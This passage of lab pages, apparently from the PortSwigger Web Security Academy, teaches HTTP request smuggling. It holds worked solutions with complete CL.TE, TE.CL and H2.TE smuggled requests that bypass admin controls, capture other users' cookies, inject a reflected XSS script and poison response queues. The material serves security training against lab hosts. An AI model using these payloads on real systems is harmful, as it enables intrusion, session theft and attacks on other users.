                    href="https://portswigger.net/academy/labs/launch/15f066df40dd7d208e9874af7dba51ac602d94871f25ccd02692a793ebffe91f?referrer=%2fweb-security%2frequest-smuggling%2ffinding%2flab-confirming-cl-te-via-differential-responses"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                Using Burp Repeater, issue the following request twice:
                            </p>
                            <code class="code-scrollable">
      POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
     </code>
                            <p>
                                The second request should receive an HTTP 404 response.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/request-smuggling">
                    HTTP request smuggling
                </a>
                , confirming a TE.CL vulnerability via differential responses
                (request-smuggling)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab involves a front-end and back-end server, and the back-end server doesn't support chunked
                encoding.
            </p>
            <p>
                To solve the lab, smuggle a request to the back-end server, so that a subsequent request for
                <code>
   /
  </code>
                (the web root) triggers a 404 Not Found response.
            </p>
            <div class="highlightedarea">
                <h4>
                    Note
                </h4>
                <p>
                    Although the lab supports HTTP/2, the intended solution requires techniques that are only possible
                    in HTTP/1. You can manually switch protocols in Burp Repeater from the
                    <strong>
                        Request attributes
                    </strong>
                    section of the
                    <strong>
                        Inspector
                    </strong>
                    panel.
                </p>
            </div>
            <div class="component-labinstructions">
                <h4>
                    Tip
                </h4>
                <p>
                    Manually fixing the length fields in request smuggling attacks can be tricky. Our
                    <a href="https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn#demo">
                        HTTP Request Smuggler
                    </a>
                    Burp extension was designed to help. You can install it via the BApp Store.
                </p>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/fe9ab531836f0124048451639920eb523e4374df7d3e1f492dc1985048adeae9?referrer=%2fweb-security%2frequest-smuggling%2ffinding%2flab-confirming-te-cl-via-differential-responses"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length"
                                option is unchecked.
                            </p>
                            <p>
                                Using Burp Repeater, issue the following request twice:
                            </p>
                            <code class="code-scrollable">
      POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
     </code>
                            <p>
                                The second request should receive an HTTP 404 response.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Exploiting
                <a href="https://portswigger.net/web-security/request-smuggling">
                    HTTP request smuggling
                </a>
                to bypass front-end security controls, CL.TE vulnerability
                (request-smuggling)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab involves a front-end and back-end server, and the front-end server doesn't support chunked
                encoding. There's an admin panel at
                <code>
   /admin
  </code>
                , but the front-end server blocks access to it.
            </p>
            <p>
                To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the
                user
                <code>
   carlos
  </code>
                .
            </p>
            <div class="highlightedarea">
                <h4>
                    Note
                </h4>
                <p>
                    Although the lab supports HTTP/2, the intended solution requires techniques that are only possible
                    in HTTP/1. You can manually switch protocols in Burp Repeater from the
                    <strong>
                        Request attributes
                    </strong>
                    section of the
                    <strong>
                        Inspector
                    </strong>
                    panel.
                </p>
            </div>
            <div class="component-labinstructions">
                <h4>
                    Tip
                </h4>
                <p>
                    Manually fixing the length fields in request smuggling attacks can be tricky. Our
                    <a href="https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn#demo">
                        HTTP Request Smuggler
                    </a>
                    Burp extension was designed to help. You can install it via the BApp Store.
                </p>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/d87789adec7383329012f5a094910fc21a7bf4958acf05f883ac78ddd12c6a37?referrer=%2fweb-security%2frequest-smuggling%2fexploiting%2flab-bypass-front-end-controls-cl-te"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Try to visit
                                    <code>
        /admin
       </code>
                                    and observe that the request is blocked.
                                </li>
                                <li>
                                    <p>
                                        Using Burp Repeater, issue the following request twice:
                                    </p>
                                    <code class="code-scrollable">
        POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X
       </code>
                                </li>
                                <li>
                                    Observe that the merged request to
                                    <code>
        /admin
       </code>
                                    was rejected due to not using the header
                                    <code>
        Host: localhost
       </code>
                                    .
                                </li>
                                <li>
                                    <p>
                                        Issue the following request twice:
                                    </p>
                                    <code class="code-scrollable">
        POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
X-Ignore: X
       </code>
                                </li>
                                <li>
                                    Observe that the request was blocked due to the second request's Host header
                                    conflicting with the smuggled Host header in the first request.
                                </li>
                                <li>
                                    <p>
                                        Issue the following request twice so the second request's headers are appended
                                        to the smuggled request body instead:
                                    </p>
                                    <code class="code-scrollable">
        POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
       </code>
                                </li>
                                <li>
                                    Observe that you can now access the admin panel.
                                </li>
                                <li>
                                    <p>
                                        Using the previous response as a reference, change the smuggled request URL to
                                        delete
                                        <code>
         carlos
        </code>
                                        :
                                    </p>
                                    <code class="code-scrollable">
        POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 139
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
       </code>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Exploiting
                <a href="https://portswigger.net/web-security/request-smuggling">
                    HTTP request smuggling
                </a>
                to bypass front-end security controls, TE.CL vulnerability
                (request-smuggling)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab involves a front-end and back-end server, and the back-end server doesn't support chunked
                encoding. There's an admin panel at
                <code>
   /admin
  </code>
                , but the front-end server blocks access to it.
            </p>
            <p>
                To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the
                user
                <code>
   carlos
  </code>
                .
            </p>
            <div class="highlightedarea">
                <h4>
                    Note
                </h4>
                <p>
                    Although the lab supports HTTP/2, the intended solution requires techniques that are only possible
                    in HTTP/1. You can manually switch protocols in Burp Repeater from the
                    <strong>
                        Request attributes
                    </strong>
                    section of the
                    <strong>
                        Inspector
                    </strong>
                    panel.
                </p>
            </div>
            <div class="component-labinstructions">
                <h4>
                    Tip
                </h4>
                <p>
                    Manually fixing the length fields in request smuggling attacks can be tricky. Our
                    <a href="https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn#demo">
                        HTTP Request Smuggler
                    </a>
                    Burp extension was designed to help. You can install it via the BApp Store.
                </p>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/c91df7d449cc4882b6bc0e5d19694f659acdcfba2c19706c49c67f947891d53c?referrer=%2fweb-security%2frequest-smuggling%2fexploiting%2flab-bypass-front-end-controls-te-cl"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Try to visit
                                    <code>
        /admin
       </code>
                                    and observe that the request is blocked.
                                </li>
                                <li>
                                    In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length"
                                    option is unchecked.
                                </li>
                                <li>
                                    <p>
                                        Using Burp Repeater, issue the following request twice:
                                    </p>
                                    <code class="code-scrollable">
        POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked

60
POST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
       </code>
                                    <div class="highlightedarea">
                                        <h4>
                                            Note
                                        </h4>
                                        <p>
                                            You need to include the trailing sequence
                                            <code>
          \r\n\r\n
         </code>
                                            following the final
                                            <code>
          0
         </code>
                                            .
                                        </p>
                                    </div>
                                </li>
                                <li>
                                    Observe that the merged request to
                                    <code>
        /admin
       </code>
                                    was rejected due to not using the header
                                    <code>
        Host: localhost
       </code>
                                    .
                                </li>
                                <li>
                                    <p>
                                        Issue the following request twice:
                                    </p>
                                    <code class="code-scrollable">
        POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

71
POST /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
       </code>
                                </li>
                                <li>
                                    Observe that you can now access the admin panel.
                                </li>
                                <li>
                                    <p>
                                        Using the previous response as a reference, change the smuggled request URL to
                                        delete
                                        <code>
         carlos
        </code>
                                        :
                                    </p>
                                    <code class="code-scrollable">
        POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked

87
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
       </code>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Exploiting
                <a href="https://portswigger.net/web-security/request-smuggling">
                    HTTP request smuggling
                </a>
                to reveal front-end request rewriting
                (request-smuggling)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab involves a front-end and back-end server, and the front-end server doesn't support chunked
                encoding.
            </p>
            <p>
                There's an admin panel at
                <code>
   /admin
  </code>
                , but it's only accessible to people with the IP address 127.0.0.1. The front-end server adds an HTTP
                header to incoming requests containing their IP address. It's similar to the
                <code>
   X-Forwarded-For
  </code>
                header but has a different name.
            </p>
            <p>
                To solve the lab, smuggle a request to the back-end server that reveals the header that is added by the
                front-end server. Then smuggle a request to the back-end server that includes the added header, accesses
                the admin panel, and deletes the user
                <code>
   carlos
  </code>
                .
            </p>
            <div class="highlightedarea">
                <h4>
                    Note
                </h4>
                <p>
                    Although the lab supports HTTP/2, the intended solution requires techniques that are only possible
                    in HTTP/1. You can manually switch protocols in Burp Repeater from the
                    <strong>
                        Request attributes
                    </strong>
                    section of the
                    <strong>
                        Inspector
                    </strong>
                    panel.
                </p>
            </div>
            <div class="component-labinstructions">
                <h4>
                    Tip
                </h4>
                <p>
                    Manually fixing the length fields in request smuggling attacks can be tricky. Our
                    <a href="https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn#demo">
                        HTTP Request Smuggler
                    </a>
                    Burp extension was designed to help. You can install it via the BApp Store.
                </p>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/9028757aac9d890a1120a8eafe6d820ba114de27c132ee12c8ae8525c9378c40?referrer=%2fweb-security%2frequest-smuggling%2fexploiting%2flab-reveal-front-end-request-rewriting"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Browse to
                                    <code>
        /admin
       </code>
                                    and observe that the admin panel can only be loaded from
                                    <code>
        127.0.0.1
       </code>
                                    .
                                </li>
                                <li>
                                    Use the site's search function and observe that it reflects the value of the
                                    <code>
        search
       </code>
                                    parameter.
                                </li>
                                <li>
                                    <p>
                                        Use Burp Repeater to issue the following request twice.
                                    </p>
                                    <code class="code-scrollable">
        POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Connection: close

search=test
       </code>
                                </li>
                                <li>
                                    The second response should contain "Search results for" followed by the start of a
                                    rewritten HTTP request.
                                </li>
                                <li>
                                    <p>
                                        Make a note of the name of the
                                        <code>
         X-*-IP
        </code>
                                        header in the rewritten request, and use it to access the admin panel:
                                    </p>
                                    <code class="code-scrollable">
        POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 143
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-abcdef-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

x=1
       </code>
                                </li>
                                <li>
                                    <p>
                                        Using the previous response as a reference, change the smuggled request URL to
                                        delete the user
                                        <code>
         carlos
        </code>
                                        :
                                    </p>
                                    <code class="code-scrollable">
        POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 166
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
X-abcdef-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

x=1
       </code>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Exploiting
                <a href="https://portswigger.net/web-security/request-smuggling">
                    HTTP request smuggling
                </a>
                to capture other users' requests
                (request-smuggling)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab involves a front-end and back-end server, and the front-end server doesn't support chunked
                encoding.
            </p>
            <p>
                To solve the lab, smuggle a request to the back-end server that causes the next user's request to be
                stored in the application. Then retrieve the next user's request and use the victim user's cookies to
                access their account.
            </p>
            <div class="highlightedarea">
                <h4>
                    Notes
                </h4>
                <ul>
                    <li>
                        Although the lab supports HTTP/2, the intended solution requires techniques that are only
                        possible in HTTP/1. You can manually switch protocols in Burp Repeater from the
                        <strong>
                            Request attributes
                        </strong>
                        section of the
                        <strong>
                            Inspector
                        </strong>
                        panel.
                    </li>
                    <li>
                        The lab simulates the activity of a victim user. Every few POST requests that you make to the
                        lab, the victim user will make their own request. You might need to repeat your attack a few
                        times to ensure that the victim user's request occurs as required.
                    </li>
                </ul>
            </div>
            <div class="component-labinstructions">
                <h4>
                    Tip
                </h4>
                <p>
                    Manually fixing the length fields in request smuggling attacks can be tricky. Our
                    <a href="https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn#demo">
                        HTTP Request Smuggler
                    </a>
                    Burp extension was designed to help. You can install it via the BApp Store.
                </p>
            </div>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                If you encounter a timeout, this may indicate that the number of bytes you're trying to
                                capture is greater than the total number of bytes in the subsequent request. Try
                                reducing the
                                <code>
       Content-Length
      </code>
                                specified in the smuggled request prefix.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/a8d351250890095aedf20e8164b719e049e192bbc1f004e58d788778d6a7e982?referrer=%2fweb-security%2frequest-smuggling%2fexploiting%2flab-capture-other-users-requests"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Visit a blog post and post a comment.
                                </li>
                                <li>
                                    Send the
                                    <code>
        comment-post
       </code>
                                    request to Burp Repeater, shuffle the body parameters so the
                                    <code>
        comment
       </code>
                                    parameter occurs last, and make sure it still works.
                                </li>
                                <li>
                                    <p>
                                        Increase the
                                        <code>
         comment-post
        </code>
                                        request's
                                        <code>
         Content-Length
        </code>
                                        to 400, then smuggle it to the back-end server:
                                    </p>
                                    <code class="code-scrollable">
        POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 256
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=your-session-token

csrf=your-csrf-token&amp;postId=5&amp;name=Carlos+Montoya&amp;email=carlos%40normal-user.net&amp;website=&amp;comment=test
       </code>
                                </li>
                                <li>
                                    View the blog post to see if there's a comment containing a user's request. Note
                                    that the target user only browses the website intermittently so you may need to
                                    repeat this attack a few times before it's successful.
                                </li>
                                <li>
                                    Copy the user's Cookie header from the comment, and use it to access their account.
                                </li>
                            </ol>
                            <div class="highlightedarea">
                                <h4>
                                    Note
                                </h4>
                                <p>
                                    If the stored request is incomplete and doesn't include the Cookie header, you will
                                    need to slowly increase the value of the Content-Length header in the smuggled
                                    request, until the whole cookie is captured.
                                </p>
                            </div>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Exploiting
                <a href="https://portswigger.net/web-security/request-smuggling">
                    HTTP request smuggling
                </a>
                to deliver
                <a href="https://portswigger.net/web-security/cross-site-scripting/reflected">
                    reflected XSS
                </a>
                (request-smuggling)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab involves a front-end and back-end server, and the front-end server doesn't support chunked
                encoding.
            </p>
            <p>
                The application is also vulnerable to
                <a href="https://portswigger.net/web-security/cross-site-scripting/reflected">
                    reflected XSS
                </a>
                via the
                <code>
   User-Agent
  </code>
                header.
            </p>
            <p>
                To solve the lab, smuggle a request to the back-end server that causes the next user's request to
                receive a response containing an XSS exploit that executes
                <code>
   alert(1)
  </code>
                .
            </p>
            <div class="highlightedarea">
                <h4>
                    Notes
                </h4>
                <ul>
                    <li>
                        Although the lab supports HTTP/2, the intended solution requires techniques that are only
                        possible in HTTP/1. You can manually switch protocols in Burp Repeater from the
                        <strong>
                            Request attributes
                        </strong>
                        section of the
                        <strong>
                            Inspector
                        </strong>
                        panel.
                    </li>
                    <li>
                        The lab simulates the activity of a victim user. Every few POST requests that you make to the
                        lab, the victim user will make their own request. You might need to repeat your attack a few
                        times to ensure that the victim user's request occurs as required.
                    </li>
                </ul>
            </div>
            <div class="component-labinstructions">
                <h4>
                    Tip
                </h4>
                <p>
                    Manually fixing the length fields in request smuggling attacks can be tricky. Our
                    <a href="https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn#demo">
                        HTTP Request Smuggler
                    </a>
                    Burp extension was designed to help. You can install it via the BApp Store.
                </p>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/c76cecbb6026af05cd93ecc7a616c391e40b73d135e309388f039ecf576fcd53?referrer=%2fweb-security%2frequest-smuggling%2fexploiting%2flab-deliver-reflected-xss"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Visit a blog post, and send the request to Burp Repeater.
                                </li>
                                <li>
                                    Observe that the comment form contains your
                                    <code>
        User-Agent
       </code>
                                    header in a hidden input.
                                </li>
                                <li>
                                    <p>
                                        Inject an XSS payload into the
                                        <code>
         User-Agent
        </code>
                                        header and observe that it gets reflected:
                                    </p>
                                    <code class="code-scrollable">
        "/&gt;&lt;script&gt;alert(1)&lt;/script&gt;
       </code>
                                </li>
                                <li>
                                    <p>
                                        Smuggle this XSS request to the back-end server, so that it exploits the next
                                        visitor:
                                    </p>
                                    <code class="code-scrollable">
        POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0

GET /post?postId=5 HTTP/1.1
User-Agent: a"/&gt;&lt;script&gt;alert(1)&lt;/script&gt;
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
       </code>
                                </li>
                            </ol>
                            <div class="highlightedarea">
                                <h4>
                                    Note
                                </h4>
                                <p>
                                    Note that the target user only browses the website intermittently so you may need to
                                    repeat this attack a few times before it's successful.
                                </p>
                            </div>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Response queue poisoning via H2.TE request smuggling
                (request-smuggling)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even
                if they have an ambiguous length.
            </p>
            <p>
                To solve the lab, delete the user
                <code>
   carlos
  </code>
                by using response queue poisoning to break into the admin panel at
                <code>
   /admin
  </code>
                . An admin user will log in approximately every 15 seconds.
            </p>
            <p>
                The connection to the back-end is reset every 10 requests, so don't worry if you get it into a bad state
                - just send a few normal requests to get a fresh connection.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/b0bedd0f5d815c54107d42a83e72de7254aa354f2dd106e6f2d8e47679ed2f60?referrer=%2fweb-security%2frequest-smuggling%2fadvanced%2fresponse-queue-poisoning%2flab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    <p>
                                        Using Burp Repeater, try smuggling an arbitrary prefix in the body of an HTTP/2
                                        request using chunked encoding as follows. Remember to expand the Inspector's
                                        <strong>
                                            Request Attributes
                                        </strong>
                                        section and make sure the protocol is set to HTTP/2 before sending the request.
                                    </p>
                                    <code class="code-scrollable">
        POST / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Transfer-Encoding: chunked

0

SMUGGLED
       </code>
                                </li>
                                <li>
                                    <p>
                                        Observe that every second request you send receives a 404 response, confirming
                                        that you have caused the back-end to append the subsequent request to the
                                        smuggled prefix.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Burp Repeater, create the following request, which smuggles a complete
                                        request to the back-end server. Note that the path in both requests points to a
                                        non-existent endpoint. This means that your request will always get a 404
                                        response. Once you have poisoned the response queue, this will make it easier to
                                        recognize any other users' responses that you have successfully captured.
                                    </p>
                                    <code class="code-scrollable">
        POST /x HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
       </code>
                                    <div class="highlightedarea">
                                        <h4>
                                            Note
                                        </h4>
                                        <p>
                                            Remember to terminate the smuggled request properly by including the
                                            sequence
                                            <code>
          \r\n\r\n
         </code>
                                            after the
                                            <code>
          Host
         </code>
                                            header.
                                        </p>
                                    </div>
                                </li>
                                <li>
                                    <p>
                                        Send the request to poison the response queue. You will receive the 404 response
                                        to your own request.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Wait for around 5 seconds, then send the request again to fetch an arbitrary
                                        response. Most of the time, you will receive your own 404 response. Any other
                                        response code indicates that you have successfully captured a response intended
                                        for the admin user. Repeat this process until you capture a 302 response
                                        containing the admin's new post-login session cookie.
                                    </p>
                                    <div class="highlightedarea">
                                        <h4>
                                            Note
                                        </h4>
                                        <p>
                                            If you receive some 200 responses but can't capture a 302 response even
                                            after a lot of attempts, send 10 ordinary requests to reset the connection
                                            and try again.
                                        </p>
                                    </div>
                                </li>
                                <li>
                                    <p>
                                        Copy the session cookie and use it to send the following request:
                                    </p>
                                    <code class="code-scrollable">
        GET /admin HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=STOLEN-SESSION-COOKIE
       </code>
                                </li>
                                <li>
                                    <p>
                                        Send the request repeatedly until you receive a 200 response containing the
                                        admin panel.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the response, find the URL for deleting
                                        <code>
         carlos
        </code>
                                        (
                                        <code>
         /admin/delete?username=carlos
        </code>
                                        ), then update the path in your request accordingly. Send the request to delete
                                        <code>
         carlos
        </code>
                                        and solve the lab.
                                    </p>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: H2.CL request smuggling
                (request-smuggling)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even
                if they have an ambiguous length.
            </p>
            <p>
                To solve the lab, perform a request smuggling attack that causes the victim's browser to load and
                execute a malicious JavaScript file from the exploit server, calling
                <code>
   alert(document.cookie)
  </code>
                . The victim user accesses the home page every 10 seconds.
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ul>
                                <li>
                                    <p>
                                        Solving this lab requires a technique that we covered in the earlier
                                        <a
                                            href="https://portswigger.net/web-security/request-smuggling/exploiting#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect">
                                            HTTP request smuggling materials
                                        </a>
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        You need to poison the connection immediately before the victim's browser
                                        attempts to import a JavaScript resource. Otherwise, it will fetch your payload
                                        from the exploit server but not execute it. You may need to repeat the attack
                                        several times before you get the timing right.
                                    </p>
                                </li>
                            </ul>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/94fed48630d16b9adc01888e546e50f8e94c1bae77065a94140339f20303ef55?referrer=%2fweb-security%2frequest-smuggling%2fadvanced%2flab-request-smuggling-h2-cl-request-smuggling"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
